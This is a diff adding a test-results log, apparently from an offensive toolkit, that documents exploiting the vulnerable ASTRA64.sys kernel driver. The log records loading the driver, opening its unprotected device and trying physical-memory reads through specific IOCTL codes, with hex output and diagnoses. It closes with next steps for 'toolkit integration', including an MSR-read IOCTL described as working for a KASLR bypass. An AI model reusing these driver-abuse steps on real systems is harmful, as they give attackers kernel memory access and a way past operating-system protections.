@@ -1,0 +1,75 @@
+=== ASTRA64.sys Safe Test - FINAL RESULTS ===
+Date: 2026-07-11
+Script: D:\Project\toolkit\astra64_safe_test.py
+Driver: D:\Project\toolkit\drivers\Vulnerable-Monitors\ASTRA64.sys
+Service: astra32test
+Device: \\.\Astra32Device0
+
+================== STEP RESULTS ==================
+
+[PASS] sc create astra32test type= kernel binpath= ...
+[PASS] sc start astra32test (driver loaded, STATE=RUNNING)
+[PASS] CreateFileW on \\.\Astra32Device0 (zero access control confirmed)
+[FAIL] Physical memory read at 0x1000, 16 bytes
+
+================== DETAILS ==================
+
+Attempt 1: IOCTL_PHYS_MAP (0x80002008)
+  Input: 24B struct (flags=1, bus=0, physaddr=0x1000, reserved=0, len=16)
+  Result: IOCTL succeeded, IoInfo=4, returned VA=0x9B471000
+  VirtualQuery on VA: State=MEM_FREE (0x10000), Protect=PAGE_NOACCESS
+  Diagnosis: ZwMapViewOfSection maps into PsInitialSystemProcess (System),
+             NOT the calling process. Returned VA is valid in System's
+             address space but inaccessible from our Python process.
+
+Attempt 2: IOCTL_PHYS_MAP_EX (0x80002010) phys=0x1000, outbuf=128
+  Result: IOCTL succeeded, IoInfo=24 (always 24 regardless of request)
+  Output (24B): 01 00 00 00 01 00 00 00 00 00 48 9B 6E 02 00 00 00 10 6F FD 09 BB FF FF
+  Interpretation:
+    [0:4]   = 0x01 (status/flags)
+    [4:8]   = 0x01 (bus type, modified from input 0)
+    [8:16]  = 0x0000026E9B480000 (kernel pool VA or usermode VA in System process)
+    [16:24] = 0xFFFFBB09FD6F1000 (kernel-mode address, likely MDL or section object)
+  Diagnosis: Returns a response struct with kernel pointers. Does NOT
+             copy physical memory data into the output buffer.
+             Requires follow-up IOCTL_MEM_COPY_OUT (0x80002088) to read.
+
+Attempt 3: IOCTL_PHYS_MAP_EX (0x80002010) phys=0xF0000, outbuf=512
+  Result: Same struct (IoInfo=24), same kernel pointers, different address irrelevant.
+  Confirms PHYS_MAP_EX returns metadata, not data.
+
+Total IOCTLs used: 4/10 (within safety budget)
+
+[PASS] sc stop astra32test
+[PASS] sc delete astra32test
+
+================== SUMMARY ==================
+
+Component             | Result
+----------------------|--------
+Driver file exists    | PASS
+sc create             | PASS
+sc start (load)       | PASS
+CreateFileW (device)  | PASS
+Physical mem read     | FAIL
+sc stop (unload)      | PASS
+sc delete (cleanup)   | PASS
+
+OVERALL: PARTIAL PASS
+
+The driver loads and creates a device with ZERO access control (any admin
+process can open it). However, the PHYS_MAP IOCTL maps physical memory
+into the System process address space rather than the calling process.
+Direct usermode physical memory read is NOT possible with the simple
+map-read-unmap flow.
+
+Root Cause: The driver's ZwMapViewOfSection uses PsInitialSystemProcess
+(or the process that DriverEntry ran in) as the target, not the IRP
+requestor's process context.
+
+Workaround needed for toolkit integration:
+  1. Use IOCTL_MEM_COPY_OUT (0x80002088) after PHYS_MAP_EX to pull data
+     from the kernel pool allocation into the IOCTL output buffer
+  2. Or use IOCTL_MSR_READ (0x800020EC) which DOES work (confirmed in
+     astra64_exploit.py report) for KASLR bypass, combined with a
+     different reading strategy
